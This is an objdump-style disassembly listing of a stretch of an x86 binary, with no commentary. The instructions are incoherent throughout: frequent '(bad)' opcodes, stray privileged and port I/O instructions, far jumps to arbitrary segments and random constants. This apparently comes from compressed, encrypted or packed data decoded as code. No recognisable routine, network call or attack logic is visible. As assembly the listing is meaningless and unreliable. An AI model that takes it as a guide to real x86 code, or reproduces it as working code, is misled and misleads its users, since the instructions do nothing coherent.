  415bd1:	mov    al,al
  415bd3:	push   ss
  415bd4:	imul   esp,DWORD PTR [esi],0x5a4ecfe8
  415bda:	test   bh,0xc0
  415bdd:	lahf   
  415bde:	ds xchg ecx,eax
  415be0:	fisub  WORD PTR [edi+0x6ecf27c4]
  415be6:	add    eax,0xfbcfceeb
  415beb:	(bad)  
  415bec:	iret   
  415bed:	aam    0x9d
  415bef:	leave  
  415bf0:	sahf   
  415bf1:	lock pushf 
  415bf3:	outs   dx,BYTE PTR ds:[esi]
  415bf4:	mov    esp,0xaf944b3d
  415bf9:	(bad)  
  415bfa:	jmp    0xe8cd0c00
  415bff:	and    al,BYTE PTR [ecx-0x5b]
  415c02:	cmp    edx,DWORD PTR [edi]
  415c04:	daa    
  415c05:	std    
  415c06:	arpl   WORD PTR [ecx],cx
  415c08:	sub    al,0x1f
  415c0a:	scas   al,BYTE PTR es:[edi]
  415c0b:	jmp    0x415b9b
  415c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0e:	arpl   WORD PTR [eax],di
  415c10:	jp     0x415c1c
  415c12:	mov    edi,DWORD PTR [edx-0x63]
  415c15:	ds pop ds
  415c17:	call   0x48f40b5a
  415c1c:	retf   0x596d
  415c1f:	cmp    bl,BYTE PTR ds:0xca55bc22
  415c25:	push   esi
  415c26:	xchg   ecx,eax
  415c27:	enter  0xc2f6,0xb
  415c2b:	mov    ds:0xec79ed18,al
  415c30:	lahf   
  415c31:	or     BYTE PTR [edx+0x21],bh
  415c34:	push   ss
  415c35:	or     BYTE PTR [esi],ah
  415c37:	or     BYTE PTR [ebx-0x531b29d8],0x98
  415c3e:	stos   BYTE PTR es:[edi],al
  415c3f:	xchg   DWORD PTR [ebp+ebx*2-0x2dedc1cd],ebp
  415c46:	jnp    0x415c35
  415c48:	inc    edi
  415c49:	into   
  415c4a:	cs jl  0x415cb0
  415c4d:	iret   
  415c4e:	cmc    
  415c4f:	push   cs
  415c50:	mov    bh,0xe6
  415c52:	sahf   
  415c53:	lods   al,BYTE PTR ds:[esi]
  415c54:	test   DWORD PTR [eax],0xc042feb2
  415c5a:	retf   
  415c5b:	sub    DWORD PTR [esi+0x23c07fc9],edx
  415c61:	jo     0x415cd8
  415c63:	sbb    BYTE PTR [eax],bh
  415c65:	jp     0x415c22
  415c67:	ror    DWORD PTR [esi],1
  415c69:	sbb    esp,DWORD PTR [esi+0x74]
  415c6c:	packssdw mm6,QWORD PTR [eax-0x79]
  415c70:	punpcklbw mm1,mm3
  415c73:	jecxz  0x415ccb
  415c75:	hlt    
  415c76:	dec    ecx
  415c77:	dec    esp
  415c78:	jno    0x415c1e
  415c7a:	adc    BYTE PTR [ecx],bh
  415c7c:	cmp    al,cl
  415c7e:	sub    BYTE PTR [ebp-0x1fe08649],al
  415c84:	mov    dh,dh
  415c86:	cmp    BYTE PTR [eax-0x51c9f92c],0x9
  415c8d:	jg     0x415cff
  415c8f:	aad    0x5d
  415c91:	mov    edx,0xf6d9a53b
  415c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c97:	fcmove st,st(7)
  415c99:	ret    
  415c9a:	inc    esp
  415c9b:	push   edx
  415c9c:	cmc    
  415c9d:	mov    ds:0x4583ea16,al
  415ca2:	lods   eax,DWORD PTR ds:[esi]
  415ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca4:	mov    al,0xcc
  415ca6:	pushf  
  415ca7:	mov    esp,0xe48a119d
  415cac:	adc    edi,DWORD PTR [ecx+0x2d80d753]
  415cb2:	xchg   ecx,eax
  415cb3:	ins    DWORD PTR es:[edi],dx
  415cb4:	pop    edx
  415cb5:	les    ebp,FWORD PTR ds:0x1e327473
  415cbb:	(bad)  
  415cbc:	dec    esi
  415cbd:	fld    TBYTE PTR [edx]
  415cbf:	ret    
  415cc0:	rol    BYTE PTR [eax],cl
	...
  415d32:	add    BYTE PTR [eax],al
  415d34:	mov    bh,0x99
  415d36:	adc    dl,BYTE PTR [ecx-0x404864c2]
  415d3c:	pop    ebp
  415d3d:	jmp    0x27e7:0x7d16e72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    bh,ah
  415d4d:	sbb    bh,dh
  415d4f:	cwde   
  415d50:	pcmpgtd mm5,QWORD PTR [esi]
  415d53:	pop    ds
  415d54:	add    al,0x30
  415d56:	mov    esi,esi
  415d58:	xor    BYTE PTR [esi*4+0x7eb46fc2],0x58
  415d60:	fcomp  DWORD PTR [edi-0x4ee35bab]
  415d66:	je     0x415d0b
  415d68:	push   0xffffff93
  415d6a:	fs fs jnp 0x415d5d
  415d6e:	int    0xc0
  415d70:	push   ds
  415d71:	fidivr DWORD PTR [edx-0x6d]
  415d74:	mov    ecx,DWORD PTR [ecx]
  415d76:	das    
  415d77:	jne    0x415da9
  415d79:	sbb    al,0x3a
  415d7b:	ror    BYTE PTR [ecx-0x6ee363d5],1
  415d81:	mov    ?,WORD PTR [edi+0x28]
  415d84:	call   0x5fc98b77
  415d89:	(bad)  
  415d8a:	or     eax,0x7bb721fd
  415d8f:	push   esp
  415d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d91:	mov    eax,edx
  415d93:	mov    ecx,0x48f14311
  415d98:	or     eax,ecx
  415d9a:	push   ss
  415d9b:	aas    
  415d9c:	nop
  415d9d:	icebp  
  415d9e:	mov    esi,0x9517f9be
  415da3:	nop
  415da4:	jp     0x415e20
  415da6:	sbb    eax,0x6c2e1d47
  415dab:	xchg   esi,eax
  415dac:	popf   
  415dad:	lods   eax,DWORD PTR ds:[esi]
  415dae:	pop    ss
  415daf:	stos   DWORD PTR es:[edi],eax
  415db0:	xchg   edx,eax
  415db1:	ret    
  415db2:	rol    DWORD PTR ds:0x967a48bd,1
  415db8:	push   ds
  415db9:	aad    0x37
  415dbb:	mov    ebp,0x91cd43c5
  415dc0:	push   ds
  415dc1:	les    esi,FWORD PTR [ebp-0x5e47fbb4]
  415dc7:	or     DWORD PTR [ebp+0x6b],esi
  415dca:	pusha  
  415dcb:	sub    eax,0x9ebad520
  415dd0:	mov    DWORD PTR [esi+0x5204af17],esp
  415dd6:	mov    edx,0xa1a0da1b
  415ddb:	pop    ebx
  415ddc:	mov    edx,DWORD PTR [ecx-0x7fb510f9]
  415de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de3:	mov    ebx,0x766b0527
  415de8:	stos   DWORD PTR es:[edi],eax
  415de9:	add    eax,0x7b7a062f
  415dee:	cmc    
  415def:	scas   al,BYTE PTR es:[edi]
  415df0:	mov    bl,0x74
  415df2:	inc    ebx
  415df3:	stc    
  415df4:	ins    DWORD PTR es:[edi],dx
  415df5:	mov    ds:0xae675961,al
  415dfa:	jecxz  0x415db5
  415dfc:	sbb    bh,cl
  415dfe:	mov    eax,ds:0x2579d551
  415e03:	shr    DWORD PTR [ecx],cl
  415e05:	xchg   ebp,eax
  415e06:	lds    esp,FWORD PTR [edi]
  415e08:	push   edi
  415e09:	xor    ah,BYTE PTR [ebp+0x61]
  415e0c:	or     BYTE PTR [edx+0x2a],ah
  415e0f:	jg     0x415dd2
  415e11:	nop
  415e12:	cmp    al,0xb3
  415e14:	xchg   esp,eax
  415e15:	ret    
  415e16:	icebp  
  415e17:	jns    0x415e5d
  415e19:	imul   edi,DWORD PTR [edx-0x20],0x37cc3056
  415e20:	div    DWORD PTR [ebp-0x6e]
  415e23:	adc    al,0xf
  415e25:	rcpps  xmm0,XMMWORD PTR [ecx]
  415e28:	adc    DWORD PTR [ebp-0x685cb9b1],0x60
  415e2f:	stos   DWORD PTR es:[edi],eax
  415e30:	bound  ebx,QWORD PTR [ebx+0x35]
  415e33:	xor    eax,0x1dec67be
  415e38:	jl     0x415e1e
  415e3a:	arpl   WORD PTR [eax+0x24b2a710],ax
  415e40:	fiadd  WORD PTR [eax]
	...
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs cld 
  415ec1:	fsubr  st,st(6)
  415ec3:	jl     0x415ed8
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	cmc    
  415ec9:	add    BYTE PTR [eax],al
  415ecb:	add    BYTE PTR [esi-0x4b],bh
  415ece:	ret    0x79d4
  415ed1:	mov    esi,fs
  415ed3:	push   ds
  415ed4:	dec    eax
  415ed5:	sti    
  415ed6:	sub    ebp,edi
  415ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed9:	popf   
  415eda:	mov    DWORD PTR [eax-0x18],0x4cbaa4ef
  415ee1:	sbb    ecx,DWORD PTR [ecx]
  415ee3:	mov    ebx,0x8e20dc58
  415ee8:	aam    0xde
  415eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eeb:	xchg   esp,eax
  415eec:	test   ecx,edi
  415eee:	push   eax
  415eef:	sar    BYTE PTR [eax],1
  415ef1:	mov    al,ds:0x35eb3503
  415ef6:	or     eax,0xf2308f68
  415efb:	sub    al,0xb3
  415efd:	mov    eax,ds:0xe01ae2c0
  415f02:	ins    BYTE PTR es:[edi],dx
  415f03:	inc    ecx
  415f04:	mov    al,ds:0x169f4b01
  415f09:	mov    dh,0x71
  415f0b:	mov    al,ds:0xa3d0db5
  415f10:	(bad)  
  415f11:	dec    edi
  415f12:	sub    esi,DWORD PTR [ebp+0x3d2ace0d]
  415f18:	ret    0xb6b8
  415f1b:	push   esp
  415f1c:	or     edx,esi
  415f1e:	in     al,dx
  415f1f:	or     BYTE PTR [edi+eiz*4],0xc0
  415f23:	(bad)
  415f27:	or     eax,DWORD PTR [ecx+0xf]
  415f2a:	in     al,dx
  415f2b:	pusha  
  415f2c:	mov    DWORD PTR [ebx+0x73],edi
  415f2f:	jmp    0xabe70a3d
  415f34:	aaa    
  415f35:	inc    ecx
  415f36:	shl    esi,1
  415f38:	jmp    0x415f59
  415f3a:	xchg   edi,eax
  415f3b:	cs pop eax
  415f3d:	or     al,0xd
  415f3f:	bound  ebp,QWORD PTR es:[eax]
  415f42:	in     al,0x76
  415f44:	lock push eax
  415f46:	sbb    ebp,DWORD PTR [esi+edx*2+0x7b]
  415f4a:	shr    BYTE PTR [eax+ebp*8],cl
  415f4d:	and    DWORD PTR [edx+ecx*1-0x1b],ebx
  415f51:	mov    ecx,0x20ae01be
  415f56:	sub    edi,DWORD PTR [eax-0x13]
  415f59:	sub    eax,DWORD PTR [eax]
  415f5b:	xchg   ecx,eax
  415f5c:	outs   dx,BYTE PTR ds:[esi]
  415f5d:	aaa    
  415f5e:	test   DWORD PTR [edi-0x1053c103],eax
  415f64:	inc    ebx
  415f65:	jne    0x415f1d
  415f67:	or     BYTE PTR [ecx+ebx*1-0x46],al
  415f6b:	bound  eax,QWORD PTR [esi-0x1bdb251]
  415f71:	fs ins BYTE PTR es:[edi],dx
  415f73:	cdq    
  415f74:	or     edi,esi
  415f76:	popa   
  415f77:	xor    edi,DWORD PTR [eax-0x4b]
  415f7a:	sub    al,0x35
  415f7c:	(bad)  
  415f7d:	jbe    0x415f5d
  415f7f:	adc    bl,BYTE PTR [edx-0x5f427baa]
  415f85:	loopne 0x416006
  415f87:	pop    es
  415f88:	and    cl,dh
  415f8a:	dec    ebp
  415f8b:	fs push ecx
  415f8d:	aaa    
  415f8e:	sub    cl,ah
  415f90:	adc    eax,0xa0389403
  415f95:	mov    ch,0x99
  415f97:	or     BYTE PTR [ebx],ah
  415f99:	in     al,dx
  415f9a:	dec    BYTE PTR ds:0xbc30cbb4
  415fa0:	gs lock out dx,eax
  415fa3:	push   0xffffffc4
  415fa5:	mov    DWORD PTR [edx+ecx*8],esp
  415fa8:	xor    BYTE PTR [ebx],0x45
  415fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fac:	dec    esi
  415fad:	dec    esp
  415fae:	inc    edx
  415faf:	mov    esp,0xe04f2cad
  415fb4:	and    al,0xf1
  415fb6:	in     al,0x35
  415fb8:	mov    BYTE PTR [eax+edi*2-0x29],ch
  415fbc:	xor    eax,0x1ed054a1
	...
  416031:	add    BYTE PTR [eax],al
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   eax,DWORD PTR [edx+0x18],0xffffffc4
  416043:	add    BYTE PTR [eax],cl
  416045:	icebp  
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    BYTE PTR [ebx+ecx*1],al
  41604e:	test   ebp,esp
  416050:	adc    al,BYTE PTR [esi+ecx*8-0x31]
  416054:	cmc    
  416055:	add    eax,eax
  416057:	add    dh,BYTE PTR [esi+0x646cbc8e]
  41605d:	xchg   ebx,eax
  41605e:	mov    ch,0xa
  416060:	inc    ecx
  416061:	xor    ebp,edi
  416063:	in     eax,0xc4
  416065:	inc    ebx
  416066:	mov    DWORD PTR [edi+0x30],edi
  416069:	sar    DWORD PTR [ebx],0x7f
  41606c:	inc    edi
  41606d:	ins    DWORD PTR es:[edi],dx
  41606e:	adc    edi,DWORD PTR [ecx-0x5e]
  416071:	or     al,0xcb
  416073:	xchg   esp,ebx
  416075:	ja     0x4160ee
  416077:	addr16 or edx,0xffffff8d
  41607b:	xchg   edx,eax
  41607c:	jo     0x4160fb
  41607e:	inc    edx
  41607f:	ins    BYTE PTR es:[edi],dx
  416080:	cmp    ch,0xd1
  416083:	mov    DWORD PTR ds:0x517baf43,edx
  416089:	dec    ecx
  41608a:	cmp    ebx,DWORD PTR [ecx]
  41608c:	adc    eax,0xc2f9312c
  416091:	jp     0x416092
  416093:	cmp    BYTE PTR [esi-0xe],dl
  416096:	out    0x9a,eax
  416098:	inc    eax
  416099:	mov    bl,0x15
  41609b:	xor    eax,0x5685abdf
  4160a0:	push   ebx
  4160a1:	das    
  4160a2:	int    0x7b
  4160a4:	leave  
  4160a5:	push   esi
  4160a6:	mov    ebp,0x5918bb7e
  4160ab:	(bad)  
  4160ac:	sbb    ah,dh
  4160ae:	inc    esi
  4160af:	mov    gs:0xe7da961,eax
  4160b5:	xchg   ebx,eax
  4160b6:	adc    ebx,DWORD PTR [ebx-0xb]
  4160b9:	jns    0x416077
  4160bb:	xor    eax,0x7b445704
  4160c0:	outs   dx,BYTE PTR ds:[esi]
  4160c1:	xor    eax,0xa1116d95
  4160c6:	mov    bl,0xd8
  4160c8:	pushf  
  4160c9:	cmp    cl,dh
  4160cb:	xor    al,0xeb
  4160cd:	lods   al,BYTE PTR ds:[esi]
  4160ce:	shl    DWORD PTR [edx-0x4cf6c746],cl
  4160d4:	test   al,0x54
  4160d6:	jl     0x41608b
  4160d8:	dec    ebx
  4160d9:	outs   dx,DWORD PTR ds:[esi]
  4160da:	mov    esp,0x5c1d7ba1
  4160df:	inc    edi
  4160e0:	retf   
  4160e1:	adc    bl,BYTE PTR [esi+0x6337750b]
  4160e7:	push   esi
  4160e8:	fs ins BYTE PTR es:[edi],dx
  4160ea:	or     DWORD PTR [esi+0x6d1faeba],esp
  4160f0:	jo     0x4160ae
  4160f2:	mov    dl,0x63
  4160f4:	xor    BYTE PTR [eax],ch
  4160f6:	jmp    DWORD PTR [ecx]
  4160f8:	in     al,dx
  4160f9:	(bad)  
  4160fa:	mov    cl,0x57
  4160fc:	popa   
  4160fd:	repnz and eax,0xe10ccf1d
  416103:	mov    eax,ds:0x662dd059
  416108:	xor    cl,BYTE PTR [edi-0x698e2c3b]
  41610e:	xchg   edi,eax
  41610f:	xchg   edx,eax
  416110:	fild   WORD PTR [eax-0x17a581e0]
  416116:	jb     0x4160c0
  416118:	and    al,0xf0
  41611a:	add    al,0x70
  41611c:	mov    BYTE PTR [ecx],dh
  41611e:	or     DWORD PTR [edx+0x716d6833],ebx
  416124:	mov    al,ds:0x4c262445
  416129:	retf   
  41612a:	inc    ecx
  41612b:	inc    esi
  41612c:	pop    esi
  41612d:	ret    
  41612e:	xchg   esp,eax
  41612f:	mov    cl,0xa7
  416131:	mov    edx,DWORD PTR [eax]
  416133:	mov    eax,ds:0xc00377b3
  416138:	ja     0x4160e3
  41613a:	mov    ebp,0x413f8438
  41613f:	inc    ebp
  416140:	into   
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    esp,edi
  4161c1:	mov    esp,0xf1fd9aa0
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	cmc    
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    BYTE PTR [esi-0x4e],bl
  4161ce:	cld    
  4161cf:	jmp    0x1bd1:0x87823cad
  4161d6:	jge    0x416192
  4161d8:	inc    ecx
  4161d9:	push   edi
  4161da:	jp     0x416225
  4161dc:	ficomp WORD PTR [edi]
  4161de:	sbb    eax,0x3fcd762e
  4161e3:	mov    edi,0x28096709
  4161e8:	add    DWORD PTR [edi-0x59],ecx
  4161eb:	xlat   BYTE PTR ds:[ebx]
  4161ec:	test   al,0x3e
  4161ee:	mov    ?,WORD PTR [esi-0x13a757f6]
  4161f4:	imul   ecx,DWORD PTR [ebx-0x67],0xa1f97ef7
  4161fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161fc:	cmc    
  4161fd:	jmp    0x416196
  4161ff:	dec    ecx
  416200:	dec    esi
  416201:	stc    
  416202:	and    al,0xe2
  416204:	mov    al,0x95
  416206:	pop    eax
  416207:	add    eax,0xf4b128a1
  41620c:	xchg   ecx,eax
  41620d:	push   ds
  41620e:	pushf  
  41620f:	xor    eax,0xc37595d0
  416214:	ror    esp,0xeb
  416217:	ret    0xe42
  41621a:	xchg   ebp,eax
  41621b:	mov    bl,0xe
  41621d:	jg     0x4161ca
  41621f:	popa   
  416220:	jl     0x416248
  416222:	ror    BYTE PTR ds:[esi],1
  416225:	add    ebx,eax
  416227:	jge    0x41625e
  416229:	jg     0x416273
  41622b:	xchg   BYTE PTR [edx+0xde329e4],cl
  416231:	aam    0xef
  416233:	mov    esp,DWORD PTR [ebx-0x5987b319]
  416239:	adc    BYTE PTR [ebp+0x63],0x7d
  41623d:	push   ds
  41623e:	fst    DWORD PTR [edi-0x62b01399]
  416244:	sbb    eax,0xdc32cc76
  416249:	push   0xffffffb6
  41624b:	mov    esp,0x8446929d
  416250:	xchg   dh,dh
  416252:	lock adc DWORD PTR [edi+0x2b],ecx
  416256:	mov    BYTE PTR [edx+0xc],dh
  416259:	out    dx,al
  41625a:	loop   0x41625c
  41625c:	es pop ecx
  41625e:	pop    ds
  41625f:	(bad)  
  416260:	xor    edx,DWORD PTR [ecx-0x23]
  416263:	(bad)  
  416264:	(bad)  [edi+ebx*4-0x7e]
  416268:	sub    eax,DWORD PTR [eax+esi*8]
  41626b:	test   dl,cl
  41626d:	dec    eax
  41626e:	repnz retf 
  416270:	addr16 repnz cmc 
  416273:	jp     0x4162bf
  416275:	inc    edi
  416276:	icebp  
  416277:	mov    ds:0x4ffae41,eax
  41627c:	add    DWORD PTR fs:[edx+edi*1-0x4e],edi
  416281:	xor    al,0xb8
  416283:	pushf  
  416284:	leave  
  416285:	mov    ah,0xa7
  416287:	popf   
  416288:	test   eax,0x5b42701f
  41628d:	imul   edi,edx,0x234d331c
  416293:	mov    edx,0x1940c465
  416298:	out    dx,al
  416299:	cmp    ah,ch
  41629b:	clc    
  41629c:	sub    BYTE PTR [esi-0x4492c9d8],ch
  4162a2:	sub    al,0xad
  4162a4:	ret    
  4162a5:	jge    0x41630f
  4162a7:	xor    DWORD PTR ds:0x99df7e1b,ebp
  4162ad:	pop    ebp
  4162ae:	xchg   edx,eax
  4162af:	test   DWORD PTR [edi],0xfb00c813
  4162b5:	mov    ah,0x36
  4162b7:	push   esi
  4162b8:	cmp    eax,0x369cd052
  4162bd:	retf   0x4fd5
  4162c0:	sbb    BYTE PTR [eax],al
	...
  416332:	add    BYTE PTR [eax],al
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	lock repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fnsave [ecx-0xd9c3cfa]
  416345:	repnz add BYTE PTR [eax],al
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    ch,bl
  41634d:	jge    0x41637b
  41634f:	out    dx,al
  416350:	js     0x41637a
  416352:	enter  0xc094,0xdf
  416356:	stos   DWORD PTR es:[edi],eax
  416357:	cmp    eax,0xf4e578fc
  41635c:	or     DWORD PTR [edx],edi
  41635e:	ss jmp 0x416341
  416361:	sar    BYTE PTR [ecx+0x581dbc1d],cl
  416367:	push   es
  416368:	pop    esp
  416369:	js     0x416369
  41636b:	xor    eax,0x4b58258e
  416370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416371:	fnstcw WORD PTR [edx]
  416373:	mov    ch,0xd2
  416375:	addr16 in eax,0xfe
  416378:	xor    eax,0xd72e32af
  41637d:	xor    BYTE PTR [ecx-0x5ac13fce],cl
  416383:	cs mov bl,0x1a
  416386:	in     al,dx
  416387:	pop    ds
  416388:	sbb    BYTE PTR cs:[eax],dh
  41638b:	sbb    al,0x39
  41638d:	inc    ebp
  41638e:	add    al,0x5e
  416390:	ss jg  0x4163c1
  416393:	cmc    
  416394:	pop    ebx
  416395:	out    dx,eax
  416396:	call   0x329ef817
  41639b:	imul   ebp,DWORD PTR [eax+0x500ca48d],0x7a
  4163a2:	pop    ebx
  4163a3:	imul   edi,DWORD PTR [esi*4+0x654a5ee8],0xfffffffa
  4163ab:	sub    DWORD PTR [eax+0x3acfca9d],edi
  4163b1:	aaa    
  4163b2:	ss jae 0x41639f
  4163b5:	lods   eax,DWORD PTR ds:[esi]
  4163b6:	and    al,BYTE PTR [edx-0x6bdc951b]
  4163bc:	cdq    
  4163bd:	inc    ecx
  4163be:	aas    
  4163bf:	dec    esp
  4163c0:	or     al,0x32
  4163c2:	aad    0xad
  4163c4:	test   ah,dl
  4163c6:	mov    ecx,0x9737f1fc
  4163cb:	fldcw  WORD PTR [ecx]
  4163cd:	sub    cl,BYTE PTR [edx+0x2ef60d3b]
  4163d3:	icebp  
  4163d4:	add    bh,dl
  4163d6:	and    bh,BYTE PTR [ebx]
  4163d8:	lods   eax,DWORD PTR ds:[esi]
  4163d9:	mov    ds:0x8a6684aa,al
  4163de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163df:	push   0xffffffbc
  4163e1:	mov    eax,0x24444a7e
  4163e6:	ja     0x416466
  4163e8:	xor    al,0xb1
  4163ea:	jbe    0x416398
  4163ec:	and    DWORD PTR [edi+0x786b8da9],ebp
  4163f2:	call   0xbc99:0xfd9f4fd5
  4163f9:	sub    al,0xbc
  4163fb:	xor    eax,0xeb3eba3c
  416400:	sub    al,0xb1
  416402:	xor    bl,bl
  416404:	in     eax,dx
  416405:	and    eax,0xcbee86f6
  41640a:	and    eax,0xd107aa25
  41640f:	out    0x46,eax
  416411:	and    esi,DWORD PTR [ebx+0x0]
  416414:	jnp    0x416441
  416416:	sahf   
  416417:	lea    esi,[edx-0x67]
  41641a:	rol    BYTE PTR [edx],0x10
  41641d:	fimul  WORD PTR [ebx-0x3b]
  416420:	mov    dl,0xee
  416422:	aaa    
  416423:	or     DWORD PTR [edx+0x2561375b],edi
  416429:	xchg   ebx,eax
  41642a:	and    BYTE PTR [ebx-0x556cfcfb],dh
  416430:	stos   DWORD PTR es:[edi],eax
  416431:	dec    edx
  416432:	(bad)  
  416434:	inc    BYTE PTR [ecx]
  416436:	in     eax,dx
  416437:	out    dx,eax
  416438:	cmp    al,0xd4
  41643a:	or     al,BYTE PTR [ecx-0x1e]
  41643d:	inc    ecx
  41643e:	fdivr  st,st(4)
  416440:	pop    DWORD PTR [eax]
	...
  4164b2:	add    BYTE PTR [eax],al
  4164b4:	in     al,0xf0
  4164b6:	sub    DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	or     DWORD PTR [edx],edi
  4164c2:	inc    esp
  4164c3:	mov    dl,0xe7
  4164c5:	repz add BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [esi],dh
  4164cd:	(bad)  
  4164ce:	or     al,0xf6
  4164d0:	pop    ecx
  4164d1:	mov    fs,ecx
  4164d3:	sbb    BYTE PTR [ebx+0x9],ah
  4164d6:	call   0x9f60035e
  4164db:	retf   
  4164dc:	hlt    
  4164dd:	mov    ch,0x24
  4164df:	sub    ebp,DWORD PTR [ebx+0x71]
  4164e2:	test   al,0x35
  4164e4:	add    dh,0x1
  4164e7:	pusha  
  4164e8:	add    al,0x58
  4164ea:	xor    eax,0x280412d3
  4164ef:	mov    esp,0x4dba6af6
  4164f4:	jae    0x41647d
  4164f6:	movd   mm4,DWORD PTR [esp+edx*4+0x70]
  4164fb:	inc    ebp
  4164fc:	ins    DWORD PTR es:[edi],dx
  4164fd:	mov    ebp,0x92b3dec
  416502:	sahf   
  416503:	push   ss
  416504:	sahf   
  416505:	push   cs
  416506:	jbe    0x416512
  416508:	xchg   ecx,eax
  416509:	xlat   BYTE PTR ds:[ebx]
  41650a:	ret    
  41650b:	lods   al,BYTE PTR ds:[esi]
  41650c:	daa    
  41650d:	mov    ah,0x2a
  41650f:	shl    DWORD PTR [eax+eiz*2],0xc6
  416513:	outs   dx,DWORD PTR ds:[esi]
  416514:	icebp  
  416515:	lods   al,BYTE PTR ds:[esi]
  416516:	clc    
  416517:	pop    edi
  416518:	pop    ecx
  416519:	les    esp,FWORD PTR [edi-0x28]
  41651c:	cmp    dl,BYTE PTR [edi-0x1e]
  41651f:	sbb    DWORD PTR [edi],0xcb8e118b
  416525:	push   eax
  416526:	sahf   
  416527:	sbb    dl,ch
  416529:	and    eax,0x61147060
  41652e:	xor    ah,cl
  416530:	jmp    0xedbf:0xd5543b36
  416537:	lds    ecx,FWORD PTR [ebp+0x1f209785]
  41653d:	or     DWORD PTR [ecx],eax
  41653f:	out    0x32,eax
  416541:	xlat   BYTE PTR ds:[ebx]
  416542:	pop    es
  416543:	adc    BYTE PTR [edi],bh
  416545:	mov    ?,ecx
  416547:	pop    ds
  416548:	xchg   edi,eax
  416549:	(bad)  
  41654a:	pop    ecx
  41654b:	mov    edi,0x20ffdf04
  416550:	retf   0x5741
  416553:	add    eax,0xc1bf7b66
  416558:	fidivr DWORD PTR ds:0xbef88de5
  41655e:	mov    ah,0x49
  416560:	or     al,0x1f
  416562:	aas    
  416563:	test   al,0x10
  416565:	xor    BYTE PTR [edi-0x5e],al
  416568:	into   
  416569:	loop   0x416512
  41656b:	mov    al,ds:0xf63e5f6e
  416570:	sbb    DWORD PTR [ecx],edx
  416572:	rcl    BYTE PTR [ebx],cl
  416574:	into   
  416575:	dec    edx
  416576:	dec    eax
  416577:	pop    ecx
  416578:	sahf   
  416579:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41657b:	(bad)  [edx-0x3f62db80]
  416581:	(bad)  
  416582:	xchg   ecx,eax
  416583:	and    bh,BYTE PTR [esi+0x7c03d9d7]
  416589:	out    0x34,eax
  41658b:	std    
  41658c:	test   al,0x79
  41658e:	jbe    0x41659a
  416590:	addr16 imul esp,ebx,0x66
  416594:	mov    edi,0x6db163a7
  416599:	shr    BYTE PTR [edx+0xebe9a8a],cl
  41659f:	nop
  4165a0:	ja     0x416578
  4165a2:	retf   0x15ea
  4165a5:	dec    edi
  4165a6:	lahf   
  4165a7:	dec    edi
  4165a8:	pop    edx
  4165a9:	xor    eax,0x804d3eb0
  4165ae:	push   eax
  4165af:	in     eax,dx
  4165b0:	or     al,0xfa
  4165b2:	pop    ecx
  4165b3:	rcr    DWORD PTR [ebx+0x46],1
  4165b6:	shr    esi,0x4d
  4165b9:	dec    eax
  4165ba:	xchg   edx,eax
  4165bb:	es loope 0x4165a5
  4165be:	mov    ds:0xc20b,al
	...
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	leave  
  416641:	push   0xf4dcd58e
  416646:	add    BYTE PTR [eax],al
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [eax+0x5dc36050],ah
  416651:	jmp    0x41667b
  416653:	ds dec esi
  416655:	les    ebx,FWORD PTR [edi-0x3c]
  416658:	pop    esi
  416659:	xchg   ecx,eax
  41665a:	in     eax,dx
  41665b:	fcom   st(2)
  41665d:	xchg   DWORD PTR [ecx],ebp
  41665f:	neg    al
  416661:	dec    esp
  416662:	outs   dx,DWORD PTR ds:[esi]
  416663:	fs mov dh,0x89
  416666:	dec    ebx
  416667:	push   esi
  416668:	cwde   
  416669:	icebp  
  41666a:	sbb    eax,0x3c4a22fc
  41666f:	leave  
  416670:	and    BYTE PTR [esp+esi*2],dl
  416673:	push   0x10
  416675:	cdq    
  416676:	pushf  
  416677:	in     eax,dx
  416678:	out    0x61,eax
  41667a:	xor    bh,BYTE PTR [eax-0x3f]
  41667d:	in     al,0xe7
  41667f:	(bad)  
  416680:	out    0xca,al
  416682:	ds push ebp
  416684:	outs   dx,BYTE PTR ds:[esi]
